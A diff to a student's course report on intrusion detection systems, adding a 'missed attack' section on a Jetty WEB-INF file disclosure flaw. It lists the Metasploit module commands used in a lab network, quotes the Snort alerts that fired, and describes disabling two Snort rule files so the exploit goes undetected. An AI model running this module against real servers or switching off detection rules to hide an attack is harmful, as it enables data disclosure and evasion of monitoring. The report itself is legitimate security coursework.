@@ -104,7 +104,29 @@ Only thing Snort notice was:
 which is a port scan notification (same you would get for using `nmap`) and by the instructions of the course __"[...] does *not* count as an attack"__.
 
 
-## MISSED ATTACK 2:
-**description**
+## MISSED ATTACK 2: Jetty WEB-INF File Disclosure
+
+### Description
+
+**Component Targeted:** Jetty
+
+**Execution Method:** Jetty suffers from a vulnerability where certain encoded URIs and ambiguous paths can access protected files in the WEB-INF folder. 
+
+**Steps in Metasploit:**
+1. Select the auxiliary module: `use gather/jetty_web_inf_disclosure`
+2. Set the target IP: `set RHOSTS <target_ip>`
+3. Execute the attack: `run`
+
+**Reason for Missing:** Snort detected the gathering attempt with the following:
+```
+[**] [1:2033460:2] ET WEB_SPECIFIC_APPS Jetty WEB-INF Information Leak Attempt Inbound (CVE-2021-34429) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 172.28.128.1:54890 -> 172.28.128.3:8080
+[**] [1:1826:7] WEB-MISC WEB-INF access [**] [Classification: Access to a Potentially Vulnerable Web Application] [Priority: 2] {TCP} 172.28.128.1:54890 -> 172.28.128.3:8080
+```
+As I was unable to find another attack that Snort could not identify I had to disable the following rules:
+```
+/rules/emerging-web_specific_apps.rules
+/rules/web-misc.rules
+```
+After that, Snort was no longer able to identify or detect the exploit.
 
 ## ESSAY: The benefits and shortcomings of using intrusion detection systems
